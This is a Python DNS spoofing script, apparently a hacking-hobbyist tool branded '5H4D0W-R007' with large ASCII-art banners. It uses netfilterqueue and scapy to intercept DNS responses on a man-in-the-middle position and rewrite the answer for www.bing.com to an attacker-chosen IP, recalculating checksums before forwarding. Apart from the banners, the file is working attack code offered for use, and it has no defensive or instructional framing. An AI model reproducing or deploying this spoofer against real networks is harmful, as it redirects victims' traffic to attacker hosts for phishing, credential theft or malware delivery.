#!/usr/bin/env/python
import scapy.all as scapy
import netfilterqueue
# netfilterqueue module used to interact with the queue

print(''' 
    ____  _   _______    _____                   ____         
   / __ \/ | / / ___/   / ___/____  ____  ____  / __/__  _____
  / / / /  |/ /\__ \    \__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
 / /_/ / /|  /___/ /   ___/ / /_/ / /_/ / /_/ / __/  __/ /    
/_____/_/ |_//____/   /____/ .___/\____/\____/_/  \___/_/     
                          /_/                                 

''')
print('''                    #### 5H4D0W-R007 #####
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
''')

print(''' ____  _   _ _  _   ____   _____        __    ____   ___   ___ _____ 
| ___|| | | | || | |  _ \ / _ \ \      / /   |  _ \ / _ \ / _ \___  |
|___ \| |_| | || |_| | | | | | \ \ /\ / /____| |_) | | | | | | | / / 
 ___) |  _  |__   _| |_| | |_| |\ V  V /_____|  _ <| |_| | |_| |/ /  
|____/|_| |_|  |_| |____/ \___/  \_/\_/      |_| \_\\___/ \___//_/   

''')

# After the queue is created to trap the request & response, accessing this queue...
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # converting packets to scapy packets

    ############################################################################
    #                                #CONCEPT                                  #
    #    Forward the request user made to DNS Server, wait for the response    #
    #             Modify IP once the response is obtained                      #
    #                                                                          #
    #                             5H4D0W-R007                                  #
    ############################################################################

    if scapy_packet.haslayer(scapy.DNSRR): #DNSResourceRecord for reponse
        qname = scapy_packet[scapy.DNSQR].qname #DNSQuestionRecord for request
        if "www.bing.com" in qname:
            print("[+] Spoofing target...")
            # Create DNSRR[response] with spoofed fields
            answer = scapy.DNSRR(rrname=qname, rdata="SPOOFED IP HERE")
            scapy_packet[scapy.DNS].an = answer #modifying the answer field
            scapy_packet[scapy.DNS].ancount = 1 #hardcoded to a single answer
            # Removing len and checksum fields for IP and UDP layer, scapy will recalculate them for spoofed packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet)) #set payload as modified scapy packet
        #print(scapy_packet.show())
    packet.accept() #to forward the packet to dest

queue = netfilterqueue.NetfilterQueue() # instance
queue.bind(0, process_packet) # process_packet -> callback function
# to connect/bind to queue0
queue.run()
